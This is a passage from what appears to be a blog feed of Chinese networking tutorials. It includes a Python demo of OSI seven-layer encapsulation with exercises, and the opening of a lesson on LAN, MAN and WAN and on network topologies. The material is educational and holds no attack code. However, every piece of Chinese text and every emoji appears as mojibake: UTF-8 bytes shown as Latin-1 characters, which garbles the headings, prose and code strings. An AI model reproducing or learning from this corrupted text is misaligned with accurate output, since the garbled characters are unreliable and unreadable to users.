class="hljs-string">&quot;&quot;&quot;æ¥æ”¶æ•°æ®ï¼šä»ç‰©ç†å±‚åˆ°åº”ç”¨å±‚&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ“¥ æ•°æ®æ¥æ”¶è¿‡ç¨‹ï¼ˆè§£å°è£…ï¼‰&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        current_data = data<br><br>        <span class="hljs-comment"># ä»ç‰©ç†å±‚åˆ°åº”ç”¨å±‚ï¼Œé€å±‚è§£å°è£…</span><br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-variable language_">self</span>.layers):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;â–²&#x27;</span> * <span class="hljs-number">35</span>&#125;</span>&quot;</span>)<br>            current_data = layer.decapsulate(current_data)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\næœ€ç»ˆæ•°æ®: <span class="hljs-subst">&#123;current_data&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">return</span> current_data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OSIä¸ƒå±‚æ¨¡å‹æ•°æ®å°è£…æ¼”ç¤º&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ“š æœ¬ç¨‹åºæ¼”ç¤ºOSIä¸ƒå±‚æ¨¡å‹çš„æ•°æ®å°è£…å’Œè§£å°è£…è¿‡ç¨‹&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># åˆ›å»ºOSIæ¨¡å‹</span><br>    osi = OSIModel()<br><br>    <span class="hljs-comment"># è¦å‘é€çš„æ•°æ®</span><br>    original_data = <span class="hljs-string">&quot;Hello, Network World!&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ¯ å‡†å¤‡å‘é€æ•°æ®: \&quot;<span class="hljs-subst">&#123;original_data&#125;</span>\&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># å‘é€æ•°æ®ï¼ˆå°è£…è¿‡ç¨‹ï¼‰</span><br>    transmitted_data = osi.send_data(original_data)<br><br>    <span class="hljs-comment"># æ¨¡æ‹Ÿæ•°æ®ä¼ è¾“</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;âš¡&quot;</span> * <span class="hljs-number">35</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   æ•°æ®é€šè¿‡ç½‘ç»œä¼ è¾“ä¸­...&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âš¡&quot;</span> * <span class="hljs-number">35</span>)<br><br>    <span class="hljs-comment"># æ¥æ”¶æ•°æ®ï¼ˆè§£å°è£…è¿‡ç¨‹ï¼‰</span><br>    received_data = osi.receive_data(transmitted_data)<br><br>    <span class="hljs-comment"># éªŒè¯</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âœ… ä¼ è¾“å®Œæˆï¼&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nå‘é€çš„æ•°æ®: <span class="hljs-subst">&#123;original_data&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ¥æ”¶çš„æ•°æ®: <span class="hljs-subst">&#123;received_data&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello, Network World!&quot;</span> <span class="hljs-keyword">in</span> received_data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ‰ æ•°æ®ä¼ è¾“æˆåŠŸï¼&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nâŒ æ•°æ®ä¼ è¾“å¤±è´¥ï¼&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> code/day03<br>python day03_osi_demo.py<br></code></pre></td></tr></table></figure><h3 id="é¢„æœŸè¾“å‡º">é¢„æœŸè¾“å‡º</h3><p>ç¨‹åºä¼šè¯¦ç»†å±•ç¤ºæ•°æ®åœ¨OSIä¸ƒå±‚æ¨¡å‹ä¸­çš„å°è£…å’Œè§£å°è£…è¿‡ç¨‹ï¼Œå¸®åŠ©ä½ ç›´è§‚ç†è§£æ¯ä¸€å±‚çš„ä½œç”¨ã€‚</p><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… OSIä¸ƒå±‚æ¨¡å‹æ˜¯ç½‘ç»œé€šä¿¡çš„æ ‡å‡†æ¨¡å‹</li><li>âœ… æ¯ä¸€å±‚éƒ½æœ‰æ˜ç¡®çš„èŒè´£</li><li>âœ… æ•°æ®å‘é€æ—¶é€å±‚å°è£…ï¼Œæ¥æ”¶æ—¶é€å±‚è§£å°è£…</li><li>âœ… åˆ†å±‚çš„ä¼˜ç‚¹æ˜¯é™ä½å¤æ‚åº¦ã€ä¾¿äºç»´æŠ¤</li></ol><h3 id="OSIä¸ƒå±‚é€Ÿè®°">OSIä¸ƒå±‚é€Ÿè®°</h3><table><thead><tr><th>å±‚æ¬¡</th><th>åç§°</th><th>å…³é”®è¯</th><th>åè®®ç¤ºä¾‹</th></tr></thead><tbody><tr><td>7</td><td>åº”ç”¨å±‚</td><td>ç”¨æˆ·æ¥å£</td><td>HTTPã€FTPã€DNS</td></tr><tr><td>6</td><td>è¡¨ç¤ºå±‚</td><td>æ ¼å¼è½¬æ¢</td><td>SSLã€JPEG</td></tr><tr><td>5</td><td>ä¼šè¯å±‚</td><td>ä¼šè¯ç®¡ç†</td><td>RPCã€SQL</td></tr><tr><td>4</td><td>ä¼ è¾“å±‚</td><td>ç«¯åˆ°ç«¯</td><td>TCPã€UDP</td></tr><tr><td>3</td><td>ç½‘ç»œå±‚</td><td>è·¯ç”±å¯»å€</td><td>IPã€ICMP</td></tr><tr><td>2</td><td>æ•°æ®é“¾è·¯å±‚</td><td>å¸§ä¼ è¾“</td><td>Ethernetã€WiFi</td></tr><tr><td>1</td><td>ç‰©ç†å±‚</td><td>æ¯”ç‰¹æµ</td><td>ç½‘çº¿ã€å…‰çº¤</td></tr></tbody></table><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><ul><li><strong>å°è£…</strong>ï¼ˆEncapsulationï¼‰ï¼šå‘é€æ•°æ®æ—¶ï¼Œé€å±‚æ·»åŠ å¤´éƒ¨ä¿¡æ¯</li><li><strong>è§£å°è£…</strong>ï¼ˆDecapsulationï¼‰ï¼šæ¥æ”¶æ•°æ®æ—¶ï¼Œé€å±‚ç§»é™¤å¤´éƒ¨ä¿¡æ¯</li><li><strong>PDU</strong>ï¼ˆProtocol Data Unitï¼‰ï¼šåè®®æ•°æ®å•å…ƒ<ul><li>åº”ç”¨å±‚ï¼šæ¶ˆæ¯ï¼ˆMessageï¼‰</li><li>ä¼ è¾“å±‚ï¼šæ®µï¼ˆSegmentï¼‰</li><li>ç½‘ç»œå±‚ï¼šåŒ…ï¼ˆPacketï¼‰</li><li>æ•°æ®é“¾è·¯å±‚ï¼šå¸§ï¼ˆFrameï¼‰</li><li>ç‰©ç†å±‚ï¼šæ¯”ç‰¹ï¼ˆBitï¼‰</li></ul></li></ul><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šå±‚æ¬¡è¯†åˆ«">ç»ƒä¹ 1ï¼šå±‚æ¬¡è¯†åˆ«</h3><p>ä»¥ä¸‹æ“ä½œåˆ†åˆ«åœ¨å“ªä¸€å±‚å®Œæˆï¼Ÿ</p><ol><li>è¾“å…¥ç½‘å€ <a href="http://www.baidu.com">www.baidu.com</a></li><li>å°†åŸŸåè§£æä¸ºIPåœ°å€</li><li>æ·»åŠ æºç«¯å£å’Œç›®æ ‡ç«¯å£</li><li>é€‰æ‹©è·¯ç”±è·¯å¾„</li><li>å°†æ•°æ®è½¬æ¢ä¸ºç”µä¿¡å·</li></ol><h3 id="ç»ƒä¹ 2ï¼šç»˜åˆ¶å°è£…è¿‡ç¨‹">ç»ƒä¹ 2ï¼šç»˜åˆ¶å°è£…è¿‡ç¨‹</h3><p>ç”»å‡º&quot;å‘é€ä¸€å°é‚®ä»¶&quot;çš„å®Œæ•´å°è£…è¿‡ç¨‹ï¼Œæ ‡æ³¨æ¯ä¸€å±‚æ·»åŠ çš„ä¿¡æ¯ã€‚</p><h3 id="ç»ƒä¹ 3ï¼šæ€è€ƒé¢˜">ç»ƒä¹ 3ï¼šæ€è€ƒé¢˜</h3><ol><li>ä¸ºä»€ä¹ˆè¦åˆ†æˆ7å±‚ï¼Ÿèƒ½ä¸èƒ½åªåˆ†3å±‚æˆ–åˆ†10å±‚ï¼Ÿ</li><li>å¦‚æœæ²¡æœ‰åˆ†å±‚ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ</li><li>å“ªäº›å±‚æ˜¯è½¯ä»¶å®ç°çš„ï¼Ÿå“ªäº›æ˜¯ç¡¬ä»¶å®ç°çš„ï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•">ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•</h3><p>ä¿®æ”¹æ¼”ç¤ºç¨‹åºï¼Œæ·»åŠ ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li>æ˜¾ç¤ºæ¯å±‚æ•°æ®çš„å¤§å°å˜åŒ–</li><li>æ¨¡æ‹Ÿæ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸¢å¤±çš„æƒ…å†µ</li><li>æ·»åŠ é”™è¯¯æ£€æµ‹å’Œé‡ä¼ æœºåˆ¶</li></ol><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><h3 id="OSI-vs-TCP-IPæ¨¡å‹">OSI vs TCP/IPæ¨¡å‹</h3><p>OSIæ˜¯ç†è®ºæ¨¡å‹ï¼ŒTCP/IPæ˜¯å®é™…ä½¿ç”¨çš„æ¨¡å‹ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livescript">OSIä¸ƒå±‚æ¨¡å‹              TCP/IPå››å±‚æ¨¡å‹<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  åº”ç”¨å±‚     â”‚ <span class="hljs-string">\</span>        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  <span class="hljs-string">\</span>       â”‚  åº”ç”¨å±‚     â”‚<br>â”‚  è¡¨ç¤ºå±‚     â”‚   &#125; â”€â”€â”€&gt; â”‚             â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  /       â”‚             â”‚<br>â”‚  ä¼šè¯å±‚     â”‚ /        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  ä¼ è¾“å±‚     â”‚  â”€â”€â”€â”€â”€&gt;  â”‚  ä¼ è¾“å±‚     â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”‚  ç½‘ç»œå±‚     â”‚  â”€â”€â”€â”€â”€&gt;  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤          â”‚  ç½‘ç»œå±‚     â”‚<br>â”‚ æ•°æ®é“¾è·¯å±‚  â”‚ <span class="hljs-string">\</span>        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  &#125; â”€â”€â”€&gt;  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  ç‰©ç†å±‚     â”‚ /        â”‚ ç½‘ç»œæ¥å£å±‚  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>æ˜å¤©æˆ‘ä»¬å°†è¯¦ç»†å­¦ä¹ TCP/IPæ¨¡å‹ï¼</strong></p><h2 id="ğŸ¯-æ˜å¤©é¢„å‘Š">ğŸ¯ æ˜å¤©é¢„å‘Š</h2><p><strong>ç¬¬4å¤©ï¼šTCP/IPå››å±‚æ¨¡å‹</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>TCP/IPæ¨¡å‹å’ŒOSIæ¨¡å‹çš„åŒºåˆ«</li><li>TCP/IPå„å±‚çš„è¯¦ç»†åŠŸèƒ½</li><li>å®é™…ç½‘ç»œä¸­å¦‚ä½•ä½¿ç”¨TCP/IP</li><li>ç¼–å†™ç¨‹åºåˆ†æçœŸå®çš„ç½‘ç»œæ•°æ®åŒ…</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šåˆ†å±‚ä¸æ˜¯ä¸ºäº†å¤æ‚åŒ–ï¼Œè€Œæ˜¯ä¸ºäº†ç®€å•åŒ–ï¼</p><p>ğŸ‘‰ <a href="day02.md">ä¸Šä¸€å¤©ï¼šç½‘ç»œçš„åˆ†ç±»å’Œæ‹“æ‰‘ç»“æ„</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day04.md">ä¸‹ä¸€å¤©ï¼šTCP/IPå››å±‚æ¨¡å‹</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2å¤©ï¼šç½‘ç»œçš„åˆ†ç±»å’Œæ‹“æ‰‘ç»“æ„</title>
    <link href="/2025/11/10/2%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%88%86%E7%B1%BB%E5%92%8C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84/"/>
    <url>/2025/11/10/2%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%88%86%E7%B1%BB%E5%92%8C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬2å¤©ï¼šç½‘ç»œçš„åˆ†ç±»å’Œæ‹“æ‰‘ç»“æ„</h1><blockquote><p>â€œç½‘ç»œå°±åƒåŸå¸‚çš„äº¤é€šç³»ç»Ÿï¼Œæœ‰ä¸åŒçš„è§„æ¨¡å’Œä¸åŒçš„è¿æ¥æ–¹å¼ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£ç½‘ç»œçš„åˆ†ç±»ï¼ˆLANã€WANã€MANï¼‰</li><li>æŒæ¡ç½‘ç»œæ‹“æ‰‘ç»“æ„çš„ç±»å‹</li><li>ç¼–å†™ç¨‹åºï¼šæ‰«æå±€åŸŸç½‘è®¾å¤‡</li></ul><h2 id="ğŸŒ-ç½‘ç»œçš„åˆ†ç±»">ğŸŒ ç½‘ç»œçš„åˆ†ç±»</h2><h3 id="æŒ‰åœ°ç†èŒƒå›´åˆ†ç±»">æŒ‰åœ°ç†èŒƒå›´åˆ†ç±»</h3><h4 id="1-å±€åŸŸç½‘ï¼ˆLAN-Local-Area-Networkï¼‰">1. å±€åŸŸç½‘ï¼ˆLAN - Local Area Networkï¼‰</h4><p><strong>å®šä¹‰</strong>ï¼šè¦†ç›–èŒƒå›´è¾ƒå°çš„ç½‘ç»œï¼Œé€šå¸¸åœ¨ä¸€ä¸ªå»ºç­‘ç‰©æˆ–æ ¡å›­å†…ã€‚</p><p><strong>ç”Ÿæ´»ä¸­çš„ä¾‹å­</strong>ï¼š</p><ul><li>ä½ å®¶é‡Œçš„WiFiç½‘ç»œ</li><li>å…¬å¸åŠå…¬å®¤çš„ç½‘ç»œ</li><li>ç½‘å§çš„ç½‘ç»œ</li><li>å­¦æ ¡æœºæˆ¿çš„ç½‘ç»œ</li></ul><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>ğŸ“ èŒƒå›´ï¼šå‡ ç±³åˆ°å‡ å…¬é‡Œ</li><li>ğŸš€ é€Ÿåº¦ï¼šå¾ˆå¿«ï¼ˆ100Mbps - 10Gbpsï¼‰</li><li>ğŸ’° æˆæœ¬ï¼šä½</li><li>ğŸ‘¥ å½’å±ï¼šä¸ªäººæˆ–å•ä½æ‰€æœ‰</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ç±»æ¯”ç†è§£ï¼š<br>å±€åŸŸç½‘ <span class="hljs-operator">=</span> ä½ å®¶çš„å†…éƒ¨ç”µè¯ç³»ç»Ÿ<br>åªèƒ½åœ¨å®¶é‡Œå‡ ä¸ªæˆ¿é—´ä¹‹é—´é€šè¯<br></code></pre></td></tr></table></figure><h4 id="2-åŸåŸŸç½‘ï¼ˆMAN-Metropolitan-Area-Networkï¼‰">2. åŸåŸŸç½‘ï¼ˆMAN - Metropolitan Area Networkï¼‰</h4><p><strong>å®šä¹‰</strong>ï¼šè¦†ç›–ä¸€ä¸ªåŸå¸‚èŒƒå›´çš„ç½‘ç»œã€‚</p><p><strong>ç”Ÿæ´»ä¸­çš„ä¾‹å­</strong>ï¼š</p><ul><li>åŸå¸‚çš„æœ‰çº¿ç”µè§†ç½‘ç»œ</li><li>åŸå¸‚å…¬å…±WiFiç½‘ç»œ</li><li>åŸå¸‚ç›‘æ§ç½‘ç»œ</li></ul><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>ğŸ“ èŒƒå›´ï¼šå‡ åå…¬é‡Œ</li><li>ğŸš€ é€Ÿåº¦ï¼šè¾ƒå¿«</li><li>ğŸ’° æˆæœ¬ï¼šä¸­ç­‰</li><li>ğŸ‘¥ å½’å±ï¼šé€šå¸¸æ˜¯è¿è¥å•†æˆ–æ”¿åºœ</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ç±»æ¯”ç†è§£ï¼š<br>åŸåŸŸç½‘ <span class="hljs-operator">=</span> åŸå¸‚çš„å…¬äº¤ç³»ç»Ÿ<br>è¿æ¥åŸå¸‚å†…çš„ä¸åŒåŒºåŸŸ<br></code></pre></td></tr></table></figure><h4 id="3-å¹¿åŸŸç½‘ï¼ˆWAN-Wide-Area-Networkï¼‰">3. å¹¿åŸŸç½‘ï¼ˆWAN - Wide Area Networkï¼‰</h4><p><strong>å®šä¹‰</strong>ï¼šè¦†ç›–å¾ˆå¤§åœ°ç†èŒƒå›´çš„ç½‘ç»œï¼Œå¯ä»¥è·¨è¶Šå›½å®¶å’Œå¤§æ´²ã€‚</p><p><strong>ç”Ÿæ´»ä¸­çš„ä¾‹å­</strong>ï¼š</p><ul><li>äº’è”ç½‘ï¼ˆInternetï¼‰</li><li>è·¨å›½å…¬å¸çš„ä¸“ç”¨ç½‘ç»œ</li><li>ç”µä¿¡è¿è¥å•†çš„éª¨å¹²ç½‘</li></ul><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>ğŸ“ èŒƒå›´ï¼šå‡ ç™¾åˆ°å‡ ä¸‡å…¬é‡Œ</li><li>ğŸš€ é€Ÿåº¦ï¼šç›¸å¯¹è¾ƒæ…¢</li><li>ğŸ’° æˆæœ¬ï¼šé«˜</li><li>ğŸ‘¥ å½’å±ï¼šè¿è¥å•†æˆ–å¤§å‹ç»„ç»‡</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ç±»æ¯”ç†è§£ï¼š<br>å¹¿åŸŸç½‘ <span class="hljs-operator">=</span> å›½é™…èˆªç©ºç½‘ç»œ<br>è¿æ¥ä¸–ç•Œå„åœ°çš„åŸå¸‚<br></code></pre></td></tr></table></figure><h3 id="å¯¹æ¯”æ€»ç»“">å¯¹æ¯”æ€»ç»“</h3><table><thead><tr><th>ç±»å‹</th><th>è¦†ç›–èŒƒå›´</th><th>ä¼ è¾“é€Ÿåº¦</th><th>å»¶è¿Ÿ</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>LAN</td><td>10m - 1km</td><td>æœ€å¿«</td><td>æœ€ä½</td><td>å®¶åº­WiFi</td></tr><tr><td>MAN</td><td>10km - 100km</td><td>è¾ƒå¿«</td><td>è¾ƒä½</td><td>åŸå¸‚ç½‘ç»œ</td></tr><tr><td>WAN</td><td>100km+</td><td>è¾ƒæ…¢</td><td>è¾ƒé«˜</td><td>äº’è”ç½‘</td></tr></tbody></table><h2 id="ğŸ”·-ç½‘ç»œæ‹“æ‰‘ç»“æ„">ğŸ”· ç½‘ç»œæ‹“æ‰‘ç»“æ„</h2><p><strong>æ‹“æ‰‘ç»“æ„</strong>å°±æ˜¯ç½‘ç»œä¸­å„ä¸ªè®¾å¤‡çš„è¿æ¥æ–¹å¼å’Œå¸ƒå±€å½¢çŠ¶ã€‚</p><h3 id="1-æ€»çº¿å‹æ‹“æ‰‘ï¼ˆBus-Topologyï¼‰">1. æ€»çº¿å‹æ‹“æ‰‘ï¼ˆBus Topologyï¼‰</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">è®¾å¤‡A</span> <span class="hljs-literal">---</span> <span class="hljs-comment">è®¾å¤‡B</span> <span class="hljs-literal">---</span> <span class="hljs-comment">è®¾å¤‡C</span> <span class="hljs-literal">---</span> <span class="hljs-comment">è®¾å¤‡D</span><br>         <span class="hljs-comment">|                      |</span><br>       <span class="hljs-comment">(æ€»çº¿)                (æ€»çº¿)</span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>âœ… ä¼˜ç‚¹ï¼šå¸ƒçº¿ç®€å•ï¼Œæˆæœ¬ä½</li><li>âŒ ç¼ºç‚¹ï¼šæ€»çº¿æ–­äº†ï¼Œæ•´ä¸ªç½‘ç»œç˜«ç—ª</li><li>ğŸ“ åº”ç”¨ï¼šæ—©æœŸä»¥å¤ªç½‘</li></ul><p><strong>ç±»æ¯”</strong>ï¼šå…¬äº¤çº¿è·¯ï¼Œæ‰€æœ‰ç«™ç‚¹éƒ½åœ¨ä¸€æ¡çº¿ä¸Š</p><h3 id="2-æ˜Ÿå‹æ‹“æ‰‘ï¼ˆStar-Topologyï¼‰">2. æ˜Ÿå‹æ‹“æ‰‘ï¼ˆStar Topologyï¼‰</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">        è®¾å¤‡B<br>          <span class="hljs-string">|</span><br>è®¾å¤‡A <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span> äº¤æ¢æœº <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span> è®¾å¤‡C<br>          <span class="hljs-string">|</span><br>        è®¾å¤‡D<br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>âœ… ä¼˜ç‚¹ï¼šä¸€ä¸ªè®¾å¤‡æ•…éšœä¸å½±å“å…¶ä»–è®¾å¤‡</li><li>âœ… ç®¡ç†æ–¹ä¾¿ï¼Œæ˜“äºæ’é”™</li><li>âŒ ç¼ºç‚¹ï¼šä¸­å¿ƒè®¾å¤‡ï¼ˆäº¤æ¢æœºï¼‰æ•…éšœï¼Œæ•´ä¸ªç½‘ç»œç˜«ç—ª</li><li>ğŸ“ åº”ç”¨ï¼š<strong>ç°ä»£æœ€å¸¸ç”¨çš„æ‹“æ‰‘ç»“æ„</strong></li></ul><p><strong>ç±»æ¯”</strong>ï¼šå¤ªé˜³ç³»ï¼Œæ‰€æœ‰è¡Œæ˜Ÿå›´ç»•å¤ªé˜³è½¬</p><h3 id="3-ç¯å‹æ‹“æ‰‘ï¼ˆRing-Topologyï¼‰">3. ç¯å‹æ‹“æ‰‘ï¼ˆRing Topologyï¼‰</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">è®¾å¤‡A <span class="hljs-comment">--- è®¾å¤‡B</span><br>  |          |<br>è®¾å¤‡D <span class="hljs-comment">--- è®¾å¤‡C</span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>âœ… ä¼˜ç‚¹ï¼šæ•°æ®ä¼ è¾“è·¯å¾„ç¡®å®š</li><li>âŒ ç¼ºç‚¹ï¼šä¸€ä¸ªè®¾å¤‡æ•…éšœå½±å“æ•´ä¸ªç½‘ç»œ</li><li>ğŸ“ åº”ç”¨ï¼šä»¤ç‰Œç¯ç½‘ç»œï¼ˆå·²è¾ƒå°‘ä½¿ç”¨ï¼‰</li></ul><p><strong>ç±»æ¯”</strong>ï¼šæ¥åŠ›èµ›è·‘ï¼Œæ¯ä¸ªäººä¼ é€’ç»™ä¸‹ä¸€ä¸ªäºº</p><h3 id="4-ç½‘çŠ¶å‹æ‹“æ‰‘ï¼ˆMesh-Topologyï¼‰">4. ç½‘çŠ¶å‹æ‹“æ‰‘ï¼ˆMesh Topologyï¼‰</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">è®¾å¤‡A --- è®¾å¤‡B<br> |<span class="hljs-string"> \    / </span>|<br> |<span class="hljs-string">  \ /   </span>|<br> |<span class="hljs-string">  / \   </span>|<br> |<span class="hljs-string"> /    \ </span>|<br>è®¾å¤‡D --- è®¾å¤‡C<br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>âœ… ä¼˜ç‚¹ï¼šå¯é æ€§æé«˜ï¼Œæœ‰å¤šæ¡è·¯å¾„</li><li>âŒ ç¼ºç‚¹ï¼šå¸ƒçº¿å¤æ‚ï¼Œæˆæœ¬é«˜</li><li>ğŸ“ 